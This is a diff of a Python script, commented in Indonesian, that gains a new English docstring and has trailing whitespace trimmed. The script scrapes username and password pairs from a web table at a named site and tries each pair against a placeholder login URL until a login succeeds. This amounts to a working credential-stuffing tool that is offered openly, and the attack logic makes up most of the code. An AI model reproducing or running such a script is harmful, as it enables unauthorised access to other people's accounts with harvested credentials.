@@ -1,9 +1,24 @@
+"""
+This script scrapes a website for a table of usernames and passwords,
+then attempts to log in to a specified URL with the scraped credentials.
+
+The script uses Selenium to render the initial webpage and BeautifulSoup
+to parse the HTML and extract the login credentials from a table. It
+then iterates through the list of credentials, attempting to log in
+with each pair until a successful login is achieved.
+
+The script requires the following to be configured:
+    - The `driver.get()` call should be updated with the URL of the
+      website to scrape.
+    - The `URL` variable in the login loop should be updated with the
+      login page URL.
+"""
 from selenium import webdriver
 from bs4 import BeautifulSoup
 import requests
 
 #INISIALISASI WEBDRIVER
-driver = webdriver.Chrome()                 
+driver = webdriver.Chrome()
 driver.get("https://ayogram.com/widpedia/")
 
 data = []
@@ -13,16 +28,16 @@ empas = []
 
 #PARSING DENGAN BeautifulSoup
 content = driver.page_source
-soup = BeautifulSoup(content, 'html.parser') 
+soup = BeautifulSoup(content, 'html.parser')
 
 #CARI TABEL DATA
-for a in soup.find_all('td'):                
-    b = a.get_text()                         
+for a in soup.find_all('td'):
+    b = a.get_text()
     data.append(b)
 
 #HAPUS INDEX YANG TIDAK PERLU
 i = 1
-while i < len(data):                     
+while i < len(data):
     if i%2 == 0:
         # print ("deleting arr %d" % i)
         del data[i]
@@ -57,7 +72,7 @@ for i in empas:
     USERNAME = str(val[0])
     PASSWORD = str(val[1])
     print ("Trying %s with password %s " % (USERNAME, PASSWORD))
-    
+
     #INISIALISASI LOGIN PAGE & DATA
     URL = "<login_page>"
     DATA = {'username': USERNAME, 'password': PASSWORD}
